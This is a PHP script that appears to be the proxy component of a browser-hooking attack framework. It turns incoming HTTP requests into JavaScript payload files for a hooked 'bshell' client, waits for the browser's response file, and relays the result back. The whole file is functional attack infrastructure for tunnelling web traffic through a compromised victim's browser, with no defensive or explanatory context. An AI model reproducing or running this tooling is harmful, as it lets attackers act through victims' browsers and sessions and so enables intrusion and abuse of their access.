<?php

include "classes.php";

$sId = $argv[1];
function ap($sId, $g,$s){
  file_put_contents("payloads/$sId/proxy_data$g.js", $s, LOCK_EX);
  Log::loga("proxy => wrote '".str_replace("\n", "", trim($s))."' to client in payloads/$sId/proxy_data$g.js");
}

$fd = fopen("php://stdin", "r"); 
$e=1;$g=rand();

while(true) {
  Log::loga("proxy => $sId => next request please!");
  $os="";$req=array();
  while(($s=fgets($fd))) {
    Log::loga("proxy => $sId =>  read '$s' from client");
    if(trim($s)==""){
      if(count($req) == 0)
	die("request empty");
      $request = new stdClass();
      $p1 = preg_match("/^(GET|POST)\ ([^\ ]+)\ (HTTP\/1\.[01]+)/i", $req[0], $m);
      if($p1 > 0) {
	$request->method = $m[1];
	$request->url = $m[2];
	$os = "function(bsh) {\n";
	$os.="  bsh.plugins.http_proxy.process('proxy_data".$g.".js', ".json_encode($request).");\n";
	$os.="}(bshell);\n";
	//Log::loga("proxy => request: " . $os);
	ap($sId, $g, $os);
      } else {
	print "HTTP/1.0 500 Internal Server Error\n";
	/*	print print_r($req,1) . "\n";
	print "p1: $p1\n";
	print print_r($m,1) . "\n";;*/
	print "\n\nSorry\n";
      }
      $e=1;
      break;
    } else if($e==1) {
      $g++;
      $e=0;
    }

    if($e == 0) {
      $req[] = $s;
    }
    else if($e==1)
      break;
  }

  $resFile = "payloads/$sId/res/proxy_data$g.js.res";
  if($os != "") {
    $t=0;
    Log::loga("proxy => $sId => waiting for response");
    @unlink($resFile);
    while($t++ < 120) {
      if(file_exists($resFile)) {
	Log::loga("proxy => $sId => response has arrived..");
	$s=file_get_contents($resFile);
	$o=json_decode($s);
	print "HTTP/1.0 200 OK\r\n";
	foreach($o->headers as $name => $value)
	  print $name.": " . $value . "\r\n";
	print "\r\n";
	if($o->content->encoding == "base64") {
	  print urldecode(base64_decode(urldecode($o->content->data)));
	} else {
	  print $o->content->data;
	}
	rename($resFile, $resFile.".processed");
	break;
      }
      else
	sleep(1);
    }
    Log::loga("proxy => $sId => response handled for ");
    exit();
  } else
    sleep(1);
}
?>
